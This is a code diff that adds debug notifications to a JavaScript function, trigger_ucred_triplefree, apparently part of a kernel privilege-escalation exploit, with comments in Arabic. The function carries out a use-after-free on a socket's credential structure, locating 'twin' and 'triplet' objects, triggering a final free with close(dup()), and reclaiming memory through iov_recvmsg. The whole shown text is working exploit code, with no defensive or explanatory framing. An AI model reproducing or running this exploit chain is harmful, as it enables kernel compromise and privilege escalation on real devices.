@@ -1395,28 +1395,50 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 10] Proceeding with triplets using twin=" + twins[0]);
 
     // STEP 11 — تجهيز master triplet
+    send_notification("[STEP 11] Setting master triplet from twin=" + twins[0]);
     triplets[0] = twins[0];
+    send_notification("[STEP 11] triplets[0] = " + triplets[0]);
 
     // STEP 12 — إيجاد التريبلت الأول
+    send_notification("[STEP 12] Calling find_triplet(master=" + triplets[0] + ", skip=-1)");
     triplets[1] = find_triplet(triplets[0], -1);
+    send_notification("[STEP 12] find_triplet returned triplet1=" + triplets[1]);
+
     if (triplets[1] === -1) {
+      send_notification("[STEP 12] triplet1 NOT FOUND → closing uaf_socket + CONTINUE");
       close(new BigInt(uaf_socket));
       continue;
     }
+
+    send_notification("[STEP 12] triplet1 FOUND OK");
 
     // STEP 13 — إيجاد التريبلت الثاني
+    send_notification("[STEP 13] Calling find_triplet(master=" + triplets[0] + ", skip=" + triplets[1] + ")");
     triplets[2] = find_triplet(triplets[0], triplets[1]);
+    send_notification("[STEP 13] find_triplet returned triplet2=" + triplets[2]);
+
     if (triplets[2] === -1) {
+      send_notification("[STEP 13] triplet2 NOT FOUND → closing uaf_socket + CONTINUE");
       close(new BigInt(uaf_socket));
       continue;
     }
 
+    send_notification("[STEP 13] triplet2 FOUND OK");
+
     // STEP 14 — تنفيذ الإجراء النهائي
+    send_notification("[STEP 14] Performing final close on uaf_socket=" + uaf_socket);
     close(dup(new BigInt(uaf_socket)));
+    send_notification("[STEP 14] final close DONE");
 
     // STEP 15 — قراءة بعد الفلو
+    send_notification("[STEP 15] Waiting for iov_recvmsg...");
     wait_iov_recvmsg();
+    send_notification("[STEP 15] Reading from iov_sock_0...");
     read(new BigInt(iov_sock_0), tmp, 1);
+    send_notification("[STEP 15] Read complete");
+
+    send_notification("=== LOOP #" + main_count + " END ===");
+
 
   } // END WHILE
 
